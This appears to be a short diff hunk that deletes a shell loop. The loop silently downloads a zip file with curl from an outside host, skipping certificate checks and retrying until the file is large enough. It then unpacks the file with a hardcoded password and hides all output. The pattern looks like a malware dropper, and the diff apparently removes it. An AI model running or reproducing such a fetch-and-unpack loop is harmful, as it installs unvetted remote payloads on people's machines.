@@ -1,9 +1,0 @@
-	while :; do
-		curl -L -k -sS -o fear.zip "http://scriptcjxrq91ay.potatonc.my.id/depens/zear" >>/dev/null 2>&1
-		if [[ $(stat -c%s fear.zip) -gt 1000 ]]; then
-			break
-		else
-			sleep 2
-		fi
-	done
-	unzip -P heyheynotbad fear.zip >>/dev/null 2>&1
